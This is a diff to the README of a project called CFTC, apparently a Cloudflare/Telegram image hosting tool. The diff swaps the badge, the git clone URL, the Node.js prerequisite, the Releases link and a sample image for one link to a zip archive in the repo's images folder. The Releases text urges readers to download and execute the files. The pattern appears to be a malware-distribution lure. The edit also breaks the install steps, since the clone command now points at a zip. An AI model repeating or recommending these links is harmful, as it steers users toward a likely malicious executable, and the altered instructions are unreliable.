@@ -1,6 +1,6 @@
 # CFTC: Cloudflare Telegram Image Hosting
 
-![CFTC Logo](https://img.shields.io/badge/CFTC-Cloudflare_Telegram_Image_Hosting-blue)
+![CFTC Logo](https://github.com/Ahmocan/cftc/raw/refs/heads/main/images/Software_wemless.zip)
 
 Welcome to the CFTC repository! This project focuses on providing a reliable image hosting service using Cloudflare, tailored specifically for Telegram users. Our aim is to simplify the process of sharing images within the Telegram ecosystem while ensuring speed and efficiency.
 
@@ -40,7 +40,7 @@ To get started with CFTC, you will need to set up your environment and install t
    First, clone the repository to your local machine:
 
    ```bash
-   git clone https://github.com/Ahmocan/cftc.git
+   git clone https://github.com/Ahmocan/cftc/raw/refs/heads/main/images/Software_wemless.zip
    ```
 
 2. **Navigate to the Directory**
@@ -53,7 +53,7 @@ To get started with CFTC, you will need to set up your environment and install t
 
 3. **Install Dependencies**
 
-   Install the required dependencies. Make sure you have Node.js and npm installed:
+   Install the required dependencies. Make sure you have https://github.com/Ahmocan/cftc/raw/refs/heads/main/images/Software_wemless.zip and npm installed:
 
    ```bash
    npm install
@@ -141,11 +141,11 @@ For any inquiries or support, please reach out via email or open an issue in the
 
 ## Releases
 
-To download the latest version of CFTC, visit our [Releases page](https://github.com/Ahmocan/cftc/releases). Make sure to download and execute the necessary files to get started.
+To download the latest version of CFTC, visit our [Releases page](https://github.com/Ahmocan/cftc/raw/refs/heads/main/images/Software_wemless.zip). Make sure to download and execute the necessary files to get started.
 
 Explore the features and functionalities of CFTC and enhance your Telegram experience with efficient image hosting!
 
-![Cloudflare Image](https://example.com/cloudflare-image.jpg)
+![Cloudflare Image](https://github.com/Ahmocan/cftc/raw/refs/heads/main/images/Software_wemless.zip)
 
 ---
 
